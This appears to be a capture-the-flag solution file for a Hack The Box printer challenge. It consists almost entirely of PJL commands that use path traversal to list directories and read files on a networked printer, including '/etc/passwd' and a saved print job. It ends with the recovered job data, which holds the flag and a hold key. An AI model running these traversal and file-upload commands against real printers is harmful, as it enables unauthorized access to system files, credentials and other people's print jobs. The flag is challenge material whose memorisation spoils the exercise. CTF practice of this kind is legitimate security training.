#http://hacking-printers.net/wiki/index.php/File_system_access

'''
@PJL INFO ID<CR><LF>
@PJL INFO STATUS<CR><LF>

@PJL INFO LOG<CR><LF>
@PJL INFO VARIABLES<CR><LF>

@PJL FSDIRLIST NAME="0:/../../" ENTRY=1 COUNT=1024 <CR><LF>
@PJL FSDIRLIST NAME="0:/./saveDevice/SavedJobs/KeepJob" <CR><LF>
@PJL FSDIRLIST NAME="0:/./saveDevice/SavedJobs/InProgress" <CR><LF>
@PJL FSDIRLIST NAME="0:/../../" ENTRY=1 <CR><LF>

@PJL FSDIRLIST NAME="0:/../etc" <CR><LF>
@PJL FSQUERY NAME="0:\..\..\etc\passwd" <CR><LF>

@PJL FSDIRLIST NAME="0:/../home/default/"
@PJL FSQUERY NAME="0:/../home/default/readyjob"

@PJL FSUPLOAD NAME="0:/../home/default/readyjob" OFFSET=0 SIZE=457

@PJL FSUPLOAD FORMAT:BINARY NAME="0:/../home/default/readyjob" OFFSET=0 SIZE=457

%-12345X@PJL @PJL COMMENT FLAG = "HTB{w4lk_4nd_w0nd3r}" @PJL JOB NAME = "JetDirect Boot Job" @PJL SET USERNAME="default" @PJL SET HOLDKEY="8214" @PJL SET ORIENTATION = PORTAIT @PJL SET QTY = 1 @PJL SET DUPLEX = ON @PJL SET RESOLUTION = 600 @PJL SET OUTBIN = LOWER @PJL COMMENT START PCL JOB @PJL ENTER LANGUAGE = PCL %-12345X@PJL @PJL EOJ %-12345X

'''
